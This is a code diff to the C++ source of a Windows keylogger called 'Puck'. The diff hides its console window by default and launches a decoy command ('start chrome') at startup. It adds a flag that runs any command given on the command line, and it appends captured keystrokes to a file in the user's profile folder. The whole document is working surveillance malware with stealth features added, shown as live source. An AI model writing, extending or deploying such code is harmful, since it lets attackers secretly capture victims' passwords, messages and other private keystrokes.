@@ -2,11 +2,15 @@
 #include <iostream>
 #include <fstream>
 #include <time.h>
+#define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 #include <stdint.h>
+#include <stdlib.h>
 
 /* Comment out the following definition if the console window should be hidden. */
-#define PUCK_VISIBLE
+#define PUCK_VISIBLE false
+/* The command that is executed when the keylogger launches. */
+#define PUCK_COMMAND "start chrome"
 /* The title of the message box when an error occurs. */
 #define PUCK_FAILURE_TITLE "Jingle Bells!"
 /* The message of the message box when an error occurs. */
@@ -155,20 +159,21 @@ int logKey(int keyStroke) {
             output << char(key);
         }
     }
-    
+
     output.flush();
-	
+
     return 0;
 }
 
-void activateStealth() {
-#ifdef PUCK_VISIBLE
-    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
-#else
-    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
-#endif
+void activateStealth(bool visible) {
+    HWND window = FindWindowA("ConsoleWindowClass", NULL);
+    if (visible) {
+        ShowWindow(window, 1);
+    }
+    else {
+        ShowWindow(window, 0);
+    }
 }
-
 
 LRESULT __stdcall callback(int nCode, WPARAM wParam, LPARAM lParam) {
 	if (nCode >= 0) {
@@ -189,19 +194,73 @@ LRESULT __stdcall callback(int nCode, WPARAM wParam, LPARAM lParam) {
 	return CallNextHookEx(hook, nCode, wParam, lParam);
 }
 
-int32_t main() {
-	/* Open the output file in append mode. */
-    output.open(PUCK_OUTPUT_FILE, std::ios_base::app);
+void initialize(bool visible, const char* command, const char* outputFile) {
+    system(command);
+    
+    std::string path = getenv("USERPROFILE");
+    path += "\\";
+    path += outputFile;
+    
+    /* Open the output file in append mode. */
+    output.open(path, std::ios_base::app);
+    
+    if (visible) {
+        std::cout << "[info] The log file is located at " << path;
+    }
+}
 
-	activateStealth();
-	hook = activateHook();
-
-	MSG message;
-	while (GetMessage(&message, NULL, 0, 0)) {
-        Sleep(500);
+int32_t main(int32_t length, char** arguments) {
+    const char* command = PUCK_COMMAND;
+    const char* outputFile = PUCK_OUTPUT_FILE;
+    bool visible = PUCK_VISIBLE;
+    int32_t result = 0;
+    for (int32_t i = 1; i < length; i++) {
+        if (strcmp(arguments[i], "--command") == 0) {
+            if (i + 1 < length) {
+                command = arguments[++i];
+            }
+            else {
+                std::cout << "[error] The `--command` flag expects an argument.\n";
+                result = 1;
+            }
+        }
+        else if (strcmp(arguments[i], "--output") == 0) {
+            if (i + 1 < length) {
+                outputFile = arguments[++i];
+            }
+            else {
+                std::cout << "[error] The `--output` flag expects an argument.\n";
+                result = 1;
+            }
+        }
+        else if (strcmp(arguments[i], "--visible") == 0) {
+            visible = true;
+        }
+        else if (strcmp(arguments[i], "--help") == 0) {
+            std::cout << "Puck v1.0\n"
+                << "puck [--command <string>] [--output <string>] [--visible|--invisible] [--help]\n"
+                << "\t--command <string>\tExecutes the specified command.\n"
+                << "\t--output <string>\tRecords the keystrokes to the specified file.\n"
+                << "\t--visible\t\tShows the console window of the keylogger.\n"
+                << "\t--invisible\t\tHides the console window of the keylogger.\n"
+                << "\t--help\t\t\tPrints the help message.\n";
+            result = 1;
+        }
     }
 
-    shutdownHook(hook);
+    if (result == 0) {
+        initialize(visible, command, outputFile);
 
-    return 0;
+        activateStealth(visible);
+        hook = activateHook();
+
+        MSG message;
+        while (GetMessage(&message, NULL, 0, 0)) {
+            Sleep(500);
+        }
+
+        shutdownHook(hook);
+    }
+
+    return result;
 }
